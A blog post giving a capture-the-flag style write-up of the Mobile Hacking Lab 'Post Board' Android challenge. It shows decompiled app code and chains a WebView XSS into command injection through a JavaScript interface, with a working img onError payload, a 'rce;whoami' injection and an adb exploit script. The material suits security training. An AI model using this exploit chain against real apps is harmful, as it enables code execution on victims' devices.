---
layout: post
title: Post Board - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Post Board](https://www.mobilehackinglab.com/course/lab-postboard) lab challenges us to understand how WebViews work in Android, and how through Cross-Site Scripting (XSS), is possible to obtain Remote Code Execution (RCE). <!--more--> In this article, I'll showcase my solution and demonstrate how an attacker could execute commands on the victim's mobile device.

### Introduction

The first step is to open the application, where we encounter a text input allowing us to enter messages in markdown format, which are then displayed in a list with markdown formatting. Upon exploring a bit, we find that the application is vulnerable to Cross-Site Scripting. For instance, if we input a message like `<img src=x onError=alert(1) />`, the application displays a popup with an alert saying "1". But what can we do with this vulnerability? To understand this, let's delve into the application's source code to see how we can escalate our vulnerability.

### Static Analysis

Opening the application in JADX, we start by examining the `AndroidManifest.xml`. Here, we find that the `MainActivity` is exported, allowing it to be opened using intents with URIs like `postboard://postmessage/<message>`.

```xml
<!--AndroidManifest.xml-->
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="com.mobilehackinglab.postboard" platformBuildVersionCode="34" platformBuildVersionName="14">
    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <permission android:name="com.mobilehackinglab.postboard.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
    <uses-permission android:name="com.mobilehackinglab.postboard.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application android:theme="@style/Theme.PostBoard" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:extractNativeLibs="false" android:fullBackupContent="@xml/backup_rules" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules">
        <activity android:name="com.mobilehackinglab.postboard.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="postboard" android:host="postmessage"/>
            </intent-filter>
        </activity>
        <provider android:name="androidx.startup.InitializationProvider" android:exported="false" android:authorities="com.mobilehackinglab.postboard.androidx-startup">
            <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
            <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
        </provider>
    </application>
</manifest>
```

Next, we look into the `MainActivity` class, where the web content is loaded. It implements the `handleIntent` function, which checks if the application was opened with `android.intent.action.VIEW` and the URI is `postboard://postmessage/<message>`. If so, it decodes the base64 `<message>` and executes the `javascript:WebAppInterface.postMarkdownMessage` function, or `javascript:WebAppInterface.postCowsayMessage` in case of an error. However, the most important part to examine in this class is the implementation of a custom `WebAppInterface`.


```java
// MainActivity
package com.mobilehackinglab.postboard;

...
import kotlin.text.StringsKt;

/* compiled from: MainActivity.kt */
@Metadata(m30d1 = {"\u0000(\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\b\u0010\u0005\u001a\u00020\u0006H\u0002J\u0012\u0010\u0007\u001a\u00020\u00062\b\u0010\b\u001a\u0004\u0018\u00010\tH\u0014J\u0010\u0010\n\u001a\u00020\u00062\u0006\u0010\u000b\u001a\u00020\fH\u0003R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000¨\u0006\r"}, m29d2 = {"Lcom/mobilehackinglab/postboard/MainActivity;", "Landroidx/appcompat/app/AppCompatActivity;", "()V", "binding", "Lcom/mobilehackinglab/postboard/databinding/ActivityMainBinding;", "handleIntent", "", "onCreate", "savedInstanceState", "Landroid/os/Bundle;", "setupWebView", "webView", "Landroid/webkit/WebView;", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes4.dex */
public final class MainActivity extends AppCompatActivity {
    private ActivityMainBinding binding;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
        Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");
        this.binding = inflate;
        ActivityMainBinding activityMainBinding = null;
        if (inflate == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            inflate = null;
        }
        setContentView(inflate.getRoot());
        CowsayUtil.Companion.initialize(this);
        ActivityMainBinding activityMainBinding2 = this.binding;
        if (activityMainBinding2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
        } else {
            activityMainBinding = activityMainBinding2;
        }
        WebView webView = activityMainBinding.webView;
        Intrinsics.checkNotNullExpressionValue(webView, "webView");
        setupWebView(webView);
        handleIntent();
    }

    private final void setupWebView(WebView webView) {
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebChromeClient(new WebAppChromeClient());
        webView.addJavascriptInterface(new WebAppInterface(), "WebAppInterface");
        webView.loadUrl("file:///android_asset/index.html");
    }

    private final void handleIntent() {
        Intent intent = getIntent();
        String action = intent.getAction();
        Uri data = intent.getData();
        if (!Intrinsics.areEqual("android.intent.action.VIEW", action) || data == null || !Intrinsics.areEqual(data.getScheme(), "postboard") || !Intrinsics.areEqual(data.getHost(), "postmessage")) {
            return;
        }
        ActivityMainBinding activityMainBinding = null;
        try {
            String path = data.getPath();
            byte[] decode = Base64.decode(path != null ? StringsKt.drop(path, 1) : null, 8);
            Intrinsics.checkNotNullExpressionValue(decode, "decode(...)");
            String message = StringsKt.replace$default(new String(decode, Charsets.UTF_8), "'", "\\'", false, 4, (Object) null);
            ActivityMainBinding activityMainBinding2 = this.binding;
            if (activityMainBinding2 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("binding");
                activityMainBinding2 = null;
            }
            activityMainBinding2.webView.loadUrl("javascript:WebAppInterface.postMarkdownMessage('" + message + "')");
        } catch (Exception e) {
            ActivityMainBinding activityMainBinding3 = this.binding;
            if (activityMainBinding3 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("binding");
            } else {
                activityMainBinding = activityMainBinding3;
            }
            activityMainBinding.webView.loadUrl("javascript:WebAppInterface.postCowsayMessage('" + e.getMessage() + "')");
        }
    }
}
```

Looking into the `WebAppInterface`, we find two interesting functions: `postMarkdownMessage` and `postCowsayMessage`.

The `postMarkdownMessage` function receives a message and returns the HTML version of the markdown message, while the `postCowsayMessage` function receives a message and executes `cowsay.sh`. 

```java
package com.mobilehackinglab.postboard;

...
import org.json.JSONArray;

/* compiled from: WebAppInterface.kt */
@Metadata(m30d1 = {"\u0000 \n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0005\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\b\u0010\u0005\u001a\u00020\u0006H\u0007J\b\u0010\u0007\u001a\u00020\bH\u0007J\u0010\u0010\t\u001a\u00020\u00062\u0006\u0010\n\u001a\u00020\bH\u0007J\u0010\u0010\u000b\u001a\u00020\u00062\u0006\u0010\f\u001a\u00020\bH\u0007R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006\r"}, m29d2 = {"Lcom/mobilehackinglab/postboard/WebAppInterface;", "", "()V", "cache", "LWebAppCache;", "clearCache", "", "getMessages", "", "postCowsayMessage", "cowsayMessage", "postMarkdownMessage", "markdownMessage", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes4.dex */
public final class WebAppInterface {
    private final WebAppCache cache = new WebAppCache();

    @JavascriptInterface
    public final String getMessages() {
        List messages = this.cache.getMessages();
        String jSONArray = new JSONArray((Collection) messages).toString();
        Intrinsics.checkNotNullExpressionValue(jSONArray, "toString(...)");
        return jSONArray;
    }

    @JavascriptInterface
    public final void clearCache() {
        this.cache.clearCache();
    }

    @JavascriptInterface
    public final void postMarkdownMessage(String markdownMessage) {
        Intrinsics.checkNotNullParameter(markdownMessage, "markdownMessage");
        String html = new Regex("```(.*?)```", RegexOption.DOT_MATCHES_ALL).replace(markdownMessage, "<pre><code>$1</code></pre>");
        String html2 = new Regex("`([^`]+)`").replace(html, "<code>$1</code>");
        String html3 = new Regex("!\\[(.*?)\\]\\((.*?)\\)").replace(html2, "<img src='$2' alt='$1'/>");
        String html4 = new Regex("###### (.*)").replace(html3, "<h6>$1</h6>");
        String html5 = new Regex("##### (.*)").replace(html4, "<h5>$1</h5>");
        String html6 = new Regex("#### (.*)").replace(html5, "<h4>$1</h4>");
        String html7 = new Regex("### (.*)").replace(html6, "<h3>$1</h3>");
        String html8 = new Regex("## (.*)").replace(html7, "<h2>$1</h2>");
        String html9 = new Regex("# (.*)").replace(html8, "<h1>$1</h1>");
        String html10 = new Regex("\\*\\*(.*?)\\*\\*").replace(html9, "<b>$1</b>");
        String html11 = new Regex("\\*(.*?)\\*").replace(html10, "<i>$1</i>");
        String html12 = new Regex("~~(.*?)~~").replace(html11, "<del>$1</del>");
        String html13 = new Regex("\\[([^\\[]+)\\]\\(([^)]+)\\)").replace(html12, "<a href='$2'>$1</a>");
        String html14 = new Regex("(?m)^(\\* .+)((\\n\\* .+)*)").replace(html13, new Function1<MatchResult, CharSequence>() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$1
            @Override // kotlin.jvm.functions.Function1
            public final CharSequence invoke(MatchResult matchResult) {
                Intrinsics.checkNotNullParameter(matchResult, "matchResult");
                return "<ul>" + CollectionsKt.joinToString$default(StringsKt.split$default((CharSequence) matchResult.getValue(), new String[]{"\n"}, false, 0, 6, (Object) null), "", null, null, 0, null, new Function1<String, CharSequence>() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$1.1
                    @Override // kotlin.jvm.functions.Function1
                    public final CharSequence invoke(String it) {
                        Intrinsics.checkNotNullParameter(it, "it");
                        StringBuilder append = new StringBuilder().append("<li>");
                        String substring = it.substring(2);
                        Intrinsics.checkNotNullExpressionValue(substring, "this as java.lang.String).substring(startIndex)");
                        return append.append(substring).append("</li>").toString();
                    }
                }, 30, null) + "</ul>";
            }
        });
        String html15 = new Regex("(?m)^\\d+\\. .+((\\n\\d+\\. .+)*)").replace(html14, new Function1<MatchResult, CharSequence>() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$2
            @Override // kotlin.jvm.functions.Function1
            public final CharSequence invoke(MatchResult matchResult) {
                Intrinsics.checkNotNullParameter(matchResult, "matchResult");
                return "<ol>" + CollectionsKt.joinToString$default(StringsKt.split$default((CharSequence) matchResult.getValue(), new String[]{"\n"}, false, 0, 6, (Object) null), "", null, null, 0, null, new Function1<String, CharSequence>() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$2.1
                    @Override // kotlin.jvm.functions.Function1
                    public final CharSequence invoke(String it) {
                        Intrinsics.checkNotNullParameter(it, "it");
                        StringBuilder append = new StringBuilder().append("<li>");
                        String substring = it.substring(StringsKt.indexOf$default((CharSequence) it, '.', 0, false, 6, (Object) null) + 2);
                        Intrinsics.checkNotNullExpressionValue(substring, "this as java.lang.String).substring(startIndex)");
                        return append.append(substring).append("</li>").toString();
                    }
                }, 30, null) + "</ol>";
            }
        });
        String html16 = new Regex("^> (.*)", RegexOption.MULTILINE).replace(html15, "<blockquote>$1</blockquote>");
        this.cache.addMessage(new Regex("^(---|\\*\\*\\*|___)$", RegexOption.MULTILINE).replace(html16, "<hr>"));
    }

    @JavascriptInterface
    public final void postCowsayMessage(String cowsayMessage) {
        Intrinsics.checkNotNullParameter(cowsayMessage, "cowsayMessage");
        String asciiArt = CowsayUtil.Companion.runCowsay(cowsayMessage);
        String html = StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(asciiArt, "&", "&amp;", false, 4, (Object) null), "<", "&lt;", false, 4, (Object) null), ">", "&gt;", false, 4, (Object) null), "\"", "&quot;", false, 4, (Object) null), "'", "&#039;", false, 4, (Object) null);
        this.cache.addMessage("<pre>" + StringsKt.replace$default(html, "\n", "<br>", false, 4, (Object) null) + "</pre>");
    }
}
```

Inspecting the `CowsayUtil.Companion.runCowsay` function, we identify that it's vulnerable to command injection, which can lead to Remote Code Execution (RCE). Simply by calling this function with a parameter like `print; whoami`, an attacker can exploit this vulnerability.

```java
public final String runCowsay(String message) {
            Intrinsics.checkNotNullParameter(message, "message");
            try {
                String[] command = {"/bin/sh", "-c", CowsayUtil.scriptPath + ' ' + message};
                Process process = Runtime.getRuntime().exec(command);
                StringBuilder output = new StringBuilder();
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                BufferedReader reader = bufferedReader;
                while (true) {
                    String it = reader.readLine();
                    if (it == null) {
                        Unit unit = Unit.INSTANCE;
                        Closeable.closeFinally(bufferedReader, null);
                        process.waitFor();
                        String sb = output.toString();
                        Intrinsics.checkNotNullExpressionValue(sb, "toString(...)");
                        return sb;
                    }
                    output.append(it).append("\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
                return "cowsay: " + e.getMessage();
            }
        }
```
### Explointg  The application

Since `postCowsayMessage` is within `WebAppInterface` and we have an XSS vulnerability, we can achieve RCE through XSS. We just need to adapt our payload to call this function. Thus, our payload becomes `rce <img src=x onError=window.WebAppInterface.postCowsayMessage('rce;whoami') />`.

As we observed that `MainActivity` is exported, we can start it using the activity manager and pass our message. To simplify the process of encoding our payload, we create a script to automatically base64 encode the payload and start the application with it to obtain remote code execution.

```bash
#exploit.sh
payload="rce<img src=x onError=window.WebAppInterface.postCowsayMessage('rce;whoami') />"

base64_text=$(echo -n "$payload" | base64 -w 0)
uri="postboard://postmessage/$base64_text"

adb shell am start -a android.intent.action.VIEW -d "$uri"
adb shell am start -a android.intent.action.VIEW -d "postboard://postmessage/force_update"
``` 

All that's left is to run the script and witness the code execution on the mobile device.

### Conclusion

This lab provides us with the opportunity to understand how WebViews work in Android and how they can be vulnerable to various types of flaws that, when combined, can lead to remote code execution. It's undoubtedly one of the best labs on WebViews. Visit the lab at [MobileHackingLab - Post Board](https://www.mobilehackinglab.com/course/lab-postboard) and embark on a journey of discovery to enhance your skills in mobile security.